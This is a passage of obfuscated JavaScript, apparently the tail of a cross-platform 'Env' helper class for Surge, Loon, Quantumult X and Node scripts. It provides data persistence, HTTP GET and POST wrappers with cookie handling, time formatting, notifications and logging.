    ["lodash_set"](_0x275e82, _0x36a752, _0x4e1df0) {
      return Object(_0x275e82) !== _0x275e82 ? _0x275e82 : (Array["isArray"](_0x36a752) || (_0x36a752 = _0x36a752["toString"]()["match"](/[^.[\]]+/g) || []), _0x36a752["slice"](0, -1)["reduce"]((_0x422f87, _0x5e14f8, _0xc045b4) => Object(_0x422f87[_0x5e14f8]) === _0x422f87[_0x5e14f8] ? _0x422f87[_0x5e14f8] : _0x422f87[_0x5e14f8] = Math["abs"](_0x36a752[_0xc045b4 + 1]) >> 0 == +_0x36a752[_0xc045b4 + 1] ? [] : {}, _0x275e82)[_0x36a752[_0x36a752["length"] - 1]] = _0x4e1df0, _0x275e82);
    }

    ["getdata"](_0x3495dd) {
      let _0x18ed34 = this["getval"](_0x3495dd);

      if (/^@/["test"](_0x3495dd)) {
        const [, _0x1b6ce6, _0x2bb0fd] = /^@(.*?)\.(.*?)$/["exec"](_0x3495dd),
              _0x92caad = _0x1b6ce6 ? this["getval"](_0x1b6ce6) : '';

        if (_0x92caad) {
          try {
            const _0x43715c = JSON["parse"](_0x92caad);

            _0x18ed34 = _0x43715c ? this["lodash_get"](_0x43715c, _0x2bb0fd, '') : _0x18ed34;
          } catch (_0x2dc27a) {
            _0x18ed34 = '';
          }
        }
      }

      return _0x18ed34;
    }

    ["setdata"](_0x4a27a9, _0x38ae7b) {
      let _0x409768 = false;

      if (/^@/["test"](_0x38ae7b)) {
        const [, _0x18e365, _0x4fbd05] = /^@(.*?)\.(.*?)$/["exec"](_0x38ae7b),
              _0x52f7ad = this["getval"](_0x18e365),
              _0x2fffe6 = _0x18e365 ? "null" === _0x52f7ad ? null : _0x52f7ad || '{}' : '{}';

        try {
          const _0x1e4e7a = JSON["parse"](_0x2fffe6);

          this["lodash_set"](_0x1e4e7a, _0x4fbd05, _0x4a27a9);
          _0x409768 = this["setval"](JSON["stringify"](_0x1e4e7a), _0x18e365);
        } catch (_0x14b77c) {
          const _0x2fd694 = {};
          this['lodash_set'](_0x2fd694, _0x4fbd05, _0x4a27a9);
          _0x409768 = this["setval"](JSON["stringify"](_0x2fd694), _0x18e365);
        }
      } else {
        _0x409768 = this["setval"](_0x4a27a9, _0x38ae7b);
      }

      return _0x409768;
    }

    ["getval"](_0x271dbb) {
      return this["isSurge"]() || this["isLoon"]() ? $persistentStore["read"](_0x271dbb) : this['isQuanX']() ? $prefs["valueForKey"](_0x271dbb) : this["isNode"]() ? (this["data"] = this["loaddata"](), this["data"][_0x271dbb]) : this["data"] && this['data'][_0x271dbb] || null;
    }

    ["setval"](_0x11ce69, _0x18da65) {
      return this["isSurge"]() || this["isLoon"]() ? $persistentStore["write"](_0x11ce69, _0x18da65) : this["isQuanX"]() ? $prefs["setValueForKey"](_0x11ce69, _0x18da65) : this["isNode"]() ? (this["data"] = this["loaddata"](), this["data"][_0x18da65] = _0x11ce69, this["writedata"](), true) : this["data"] && this["data"][_0x18da65] || null;
    }

    ['initGotEnv'](_0xdd782f) {
      this["got"] = this["got"] ? this["got"] : require("got");
      this["cktough"] = this["cktough"] ? this["cktough"] : require("tough-cookie");
      this['ckjar'] = this["ckjar"] ? this["ckjar"] : new this["cktough"]["CookieJar"]();
      _0xdd782f && (_0xdd782f["headers"] = _0xdd782f["headers"] ? _0xdd782f["headers"] : {}, void 0 === _0xdd782f["headers"]['Cookie'] && void 0 === _0xdd782f["cookieJar"] && (_0xdd782f["cookieJar"] = this["ckjar"]));
    }

    ['get'](_0xeeb0f, _0x2d6897 = () => {}) {
      _0xeeb0f["headers"] && (delete _0xeeb0f["headers"]["Content-Type"], delete _0xeeb0f["headers"]["Content-Length"]);
      this["isSurge"]() || this["isLoon"]() ? (this["isSurge"]() && this["isNeedRewrite"] && (_0xeeb0f["headers"] = _0xeeb0f["headers"] || {}, Object["assign"](_0xeeb0f["headers"], {
        'X-Surge-Skip-Scripting': false
      })), $httpClient["get"](_0xeeb0f, (_0x50781a, _0x553ce0, _0x2c1870) => {
        !_0x50781a && _0x553ce0 && (_0x553ce0["body"] = _0x2c1870, _0x553ce0["statusCode"] = _0x553ce0["status"]);

        _0x2d6897(_0x50781a, _0x553ce0, _0x2c1870);
      })) : this["isQuanX"]() ? (this["isNeedRewrite"] && (_0xeeb0f["opts"] = _0xeeb0f["opts"] || {}, Object["assign"](_0xeeb0f["opts"], {
        'hints': false
      })), $task["fetch"](_0xeeb0f)['then'](_0x570df6 => {
        const {
          "statusCode": _0x228443,
          "statusCode": _0x1d1554,
          "headers": _0x7c3111,
          "body": _0xb6cd57
        } = _0x570df6;

        _0x2d6897(null, {
          'status': _0x228443,
          'statusCode': _0x1d1554,
          'headers': _0x7c3111,
          'body': _0xb6cd57
        }, _0xb6cd57);
      }, _0x46ff23 => _0x2d6897(_0x46ff23))) : this["isNode"]() && (this["initGotEnv"](_0xeeb0f), this["got"](_0xeeb0f)['on']("redirect", (_0x4dd61, _0x30f18d) => {
        try {
          if (_0x4dd61["headers"]["set-cookie"]) {
            const _0x2e82de = _0x4dd61["headers"]["set-cookie"]["map"](this["cktough"]["Cookie"]['parse'])["toString"]();

            _0x2e82de && this["ckjar"]['setCookieSync'](_0x2e82de, null);
            _0x30f18d["cookieJar"] = this["ckjar"];
          }
        } catch (_0xa0725a) {
          this["logErr"](_0xa0725a);
        }
      })["then"](_0x16047f => {
        const {
          "statusCode": _0x2c0a8b,
          "statusCode": _0x31bdd0,
          "headers": _0xea0895,
          "body": _0x5a212d
        } = _0x16047f;

        _0x2d6897(null, {
          'status': _0x2c0a8b,
          'statusCode': _0x31bdd0,
          'headers': _0xea0895,
          'body': _0x5a212d
        }, _0x5a212d);
      }, _0x4066bc => {
        const {
          "message": _0x30097b,
          "response": _0x2acfab
        } = _0x4066bc;

        _0x2d6897(_0x30097b, _0x2acfab, _0x2acfab && _0x2acfab["body"]);
      }));
    }

    ["post"](_0x36b254, _0x1f2963 = () => {}) {
      if (_0x36b254["body"] && _0x36b254["headers"] && !_0x36b254["headers"]["Content-Type"] && (_0x36b254["headers"]["Content-Type"] = "application/x-www-form-urlencoded"), _0x36b254["headers"] && delete _0x36b254["headers"]["Content-Length"], this["isSurge"]() || this["isLoon"]()) {
        this['isSurge']() && this["isNeedRewrite"] && (_0x36b254["headers"] = _0x36b254["headers"] || {}, Object["assign"](_0x36b254["headers"], {
          'X-Surge-Skip-Scripting': false
        }));
        $httpClient["post"](_0x36b254, (_0x11e20b, _0x4bb7af, _0x27c9b1) => {
          !_0x11e20b && _0x4bb7af && (_0x4bb7af["body"] = _0x27c9b1, _0x4bb7af["statusCode"] = _0x4bb7af["status"]);

          _0x1f2963(_0x11e20b, _0x4bb7af, _0x27c9b1);
        });
      } else {
        if (this["isQuanX"]()) {
          _0x36b254["method"] = "POST";
          this["isNeedRewrite"] && (_0x36b254["opts"] = _0x36b254["opts"] || {}, Object["assign"](_0x36b254["opts"], {
            'hints': false
          }));
          $task["fetch"](_0x36b254)["then"](_0x11483b => {
            const {
              "statusCode": _0xdcaf41,
              "statusCode": _0x5658df,
              "headers": _0x41a246,
              "body": _0x333cb4
            } = _0x11483b;

            _0x1f2963(null, {
              'status': _0xdcaf41,
              'statusCode': _0x5658df,
              'headers': _0x41a246,
              'body': _0x333cb4
            }, _0x333cb4);
          }, _0x211356 => _0x1f2963(_0x211356));
        } else {
          if (this["isNode"]()) {
            this["initGotEnv"](_0x36b254);
            const {
              "url": _0xcd52a1,
              ..._0x4c8c7e
            } = _0x36b254;
            this["got"]["post"](_0xcd52a1, _0x4c8c7e)["then"](_0x44f93c => {
              const {
                "statusCode": _0x446778,
                "statusCode": _0x1b1f06,
                "headers": _0x266279,
                "body": _0x146e83
              } = _0x44f93c;

              _0x1f2963(null, {
                'status': _0x446778,
                'statusCode': _0x1b1f06,
                'headers': _0x266279,
                'body': _0x146e83
              }, _0x146e83);
            }, _0xdeb0d1 => {
              const {
                "message": _0x2d1ba4,
                "response": _0x2bf37d
              } = _0xdeb0d1;

              _0x1f2963(_0x2d1ba4, _0x2bf37d, _0x2bf37d && _0x2bf37d["body"]);
            });
          }
        }
      }
    }

    ["time"](_0x1b953d) {
      let _0x40b53a = {
        'M+': new Date()['getMonth']() + 1,
        'd+': new Date()["getDate"](),
        'H+': new Date()['getHours'](),
        'm+': new Date()["getMinutes"](),
        's+': new Date()["getSeconds"](),
        'q+': Math["floor"]((new Date()["getMonth"]() + 3) / 3),
        'S': new Date()["getMilliseconds"]()
      };
      /(y+)/["test"](_0x1b953d) && (_0x1b953d = _0x1b953d["replace"](RegExp['$1'], (new Date()["getFullYear"]() + '')["substr"](4 - RegExp['$1']["length"])));

      for (let _0x3dc81d in _0x40b53a) new RegExp('(' + _0x3dc81d + ')')["test"](_0x1b953d) && (_0x1b953d = _0x1b953d["replace"](RegExp['$1'], 1 == RegExp['$1']["length"] ? _0x40b53a[_0x3dc81d] : ('00' + _0x40b53a[_0x3dc81d])["substr"](('' + _0x40b53a[_0x3dc81d])["length"])));

      return _0x1b953d;
    }

    ["msg"](_0x101de9 = _0x3984fa, _0x22d0ae = '', _0x1457c0 = '', _0x46c800) {
      const _0x37ab29 = _0x55f54f => {
        if (!_0x55f54f) {
          return _0x55f54f;
        }

        if ("string" == typeof _0x55f54f) {
          return this["isLoon"]() ? _0x55f54f : this["isQuanX"]() ? {
            'open-url': _0x55f54f
          } : this["isSurge"]() ? {
            'url': _0x55f54f
          } : void 0;
        }

        if ("object" == typeof _0x55f54f) {
          if (this["isLoon"]()) {
            let _0x53783e = _0x55f54f["openUrl"] || _0x55f54f["url"] || _0x55f54f["open-url"],
                _0x5e01fc = _0x55f54f["mediaUrl"] || _0x55f54f["media-url"];

            return {
              'openUrl': _0x53783e,
              'mediaUrl': _0x5e01fc
            };
          }

          if (this["isQuanX"]()) {
            let _0xc78600 = _0x55f54f["open-url"] || _0x55f54f["url"] || _0x55f54f["openUrl"],
                _0x5c1d06 = _0x55f54f["media-url"] || _0x55f54f["mediaUrl"];

            return {
              'open-url': _0xc78600,
              'media-url': _0x5c1d06
            };
          }

          if (this["isSurge"]()) {
            let _0x42c19e = _0x55f54f["url"] || _0x55f54f["openUrl"] || _0x55f54f["open-url"];

            return {
              'url': _0x42c19e
            };
          }
        }
      };

      if (this["isMute"] || (this["isSurge"]() || this["isLoon"]() ? $notification['post'](_0x101de9, _0x22d0ae, _0x1457c0, _0x37ab29(_0x46c800)) : this["isQuanX"]() && $notify(_0x101de9, _0x22d0ae, _0x1457c0, _0x37ab29(_0x46c800))), !this["isMuteLog"]) {
        let _0x3af388 = ['', "==============📣系统通知📣=============="];

        _0x3af388["push"](_0x101de9);

        _0x22d0ae && _0x3af388["push"](_0x22d0ae);
        _0x1457c0 && _0x3af388["push"](_0x1457c0);
        console["log"](_0x3af388["join"]("\n"));
        this["logs"] = this["logs"]["concat"](_0x3af388);
      }
    }

    ["log"](..._0x3a5f1f) {
      _0x3a5f1f["length"] > 0 && (this["logs"] = [...this["logs"], ..._0x3a5f1f]);
      console["log"](_0x3a5f1f["join"](this["logSeparator"]));
    }

    ["logErr"](_0x397a3f, _0x5ad71a) {
      const _0x24a69a = !this["isSurge"]() && !this["isQuanX"]() && !this["isLoon"]();

      _0x24a69a ? this["log"]('', '❗️' + this["name"] + ", 错误!", _0x397a3f["stack"]) : this["log"]('', '❗️' + this["name"] + ", 错误!", _0x397a3f);
    }

    ["wait"](_0x1818b2) {
      return new Promise(_0x494ce6 => setTimeout(_0x494ce6, _0x1818b2));
    }

    ["done"](_0x22055e = {}) {
      const _0x136b87 = new Date()["getTime"](),
            _0x568566 = (_0x136b87 - this["startTime"]) / 1000;

      this["log"]('', '🔔' + this["name"] + ", 结束! 🕛 " + _0x568566 + " 秒");
      this["log"]();
      (this["isSurge"]() || this["isQuanX"]() || this["isLoon"]()) && $done(_0x22055e);
    }

  }(_0x3984fa, _0x38dd96);
}
